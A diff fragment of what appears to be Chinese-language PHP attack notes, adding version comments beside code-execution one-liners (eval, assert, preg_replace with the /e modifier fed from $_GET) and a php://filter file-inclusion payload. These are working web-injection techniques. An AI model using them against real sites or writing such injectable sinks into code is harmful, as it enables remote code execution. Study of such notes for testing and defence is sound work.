@@ -71,7 +71,11 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 // PHP代碼執行
 <?php eval('echo `ls`;');       // eval裡的PHP代碼必須加;
 <?php assert('phpinfo();');    // assert裡的PHP代碼可以不加;
+
 <?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  // ？str=[phpinfo()]
+// 必須有匹配才會執行
+// PHP 5.5起，會產生 E_DEPRECATED 錯誤
+// PHP 7.0.0後，必須使用 preg_replace_callback() 代替
 
 
 // 思路：延伸數組＋回調函數 php 5.4以後的特性
